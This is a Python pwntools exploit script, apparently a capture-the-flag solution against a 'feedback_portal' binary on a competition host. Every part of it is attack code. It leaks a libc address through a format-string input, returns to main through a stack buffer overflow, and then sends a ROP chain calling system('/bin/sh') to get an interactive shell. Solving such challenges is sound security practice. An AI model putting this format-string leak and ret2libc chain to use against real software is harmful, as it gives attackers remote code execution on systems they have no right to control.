#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./feedback_portal')
libc = ELF('/home/antonio/Downloads/libc.so.6',checksec=False)

MAIN = elf.sym['main']
OFFSET = 136
RET = 0x000000000040101a

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r)
            pause()
    else:
        r = remote('offsec.m0lecon.it',13574)
    
    return r

def main():
    p = conn()
    #find the libc base address
    p.recvuntil(b"name:\n")
    p.sendline(b'AAAA.%11$p')

    raw = p.recvline()
    print(raw)
    rsp = int(raw.split(b'.')[1].decode()[:-1],16)
    print(hex(libc.symbols['_IO_file_setbuf']))
    log.info(f"leak = {rsp:#x}")
    
    libc.address = rsp - libc.symbols['_IO_2_1_stderr_']
    log.info(f"libc base = {libc.address:#x}")
    log.info(f"libc base ends with: {hex(libc.address)[-3:]}")

    #find gadgets and strings for: system('/bin/sh')
    BINSH = next(libc.search(b'/bin/sh\x00'))
    log.info(f"/bin/sh address: {BINSH:#x}")
    rop_libc = ROP(libc)
    POP_RDI = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
    log.info(f"pop rdi; ret gadget found: {POP_RDI:#x}")
    system_addr = libc.symbols['system']

    #re-execute main()
    p.recvuntil(b'feedback:\n')
    payload = flat(
        b'A'*OFFSET,
        p64(MAIN)
    )
    p.send(payload)

    print(p.recvuntil(b'name:\n', timeout=3))

    p.sendline(b'Antonio')
    
    payload2 = flat(
        b'A'*OFFSET,
        p64(POP_RDI),
        p64(BINSH),
        p64(system_addr)
    )
    p.send(payload2)
    p.interactive()

if __name__== "__main__":
    main()